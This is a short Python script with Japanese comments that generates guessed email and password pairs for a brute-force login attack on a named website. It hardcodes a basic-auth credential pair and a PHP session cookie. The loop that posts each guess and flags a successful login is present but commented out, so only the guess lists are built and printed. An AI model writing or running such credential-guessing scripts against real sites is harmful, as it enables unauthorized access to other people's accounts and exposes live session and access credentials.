from pprint import pprint
import webbrowser
import string
import requests
from requests.auth import HTTPBasicAuth

url = "https://welp.melonkun.jp/login/"
url2 = "https://welp.melonkun.jp/home/"

auth = HTTPBasicAuth('melon', 'melon')

# words = list(string.ascii_lowercase)

def test():
    words = list(string.ascii_lowercase)
    # print(f'パスワード総数：{26**6}')
    user_ids = []
    user_passwords = []
    for word_1 in words:
        user_id = word_1 + "@gmail.com"
        user_password = word_1 
        user_ids.append(user_id)
        user_passwords.append(user_password)
        # for word_2 in words:
        #     for word_3 in words:
        #         for word_4 in words:
        #             user_id = word_1 + word_2 + word_3 + word_4 + "@gmail.com"
        #             user_password = word_1 + word_2 + word_3 + word_4
        #             user_ids.append(user_id)
        #             user_passwords.append(user_password)
                    # print(user_id)
    return user_ids, user_passwords

result_ids, result_passwords = test()
# print(result_ids)

cookie = {'PHPSESSID': 'gneeu0voj1jdd75uvgs3oi09n0'} 

session = requests.Session()
# for i in range(len(result_ids)):
#     response = session.post(url, auth=auth, data={"username": result_ids[i], "password": result_passwords[i]},cookies=cookie)
    
    # if response.status_code == 200 and response.url == url2:
    #     print("ログインに成功しました。")
    #     print("特定のメールアドレス: ", result_ids[i])
    #     print("特定のパスワード: ", result_passwords[i])
    #     print(response.cookies)
    #     print(response.text)

    #     webbrowser.open(url2)
    #     break
    # else:
    #     print("特定のメールアドレス: ", result_ids[i])
    #     print("特定のパスワード: ", result_passwords[i])
    #     print("ログインに失敗しました。")

# response = requests.post(url, auth = auth , data={"username":result_ids,"password":result_passwords})

# print(response.cookies)
# print(response.text)

# webbrowser.open(url2)

pprint(result_passwords)
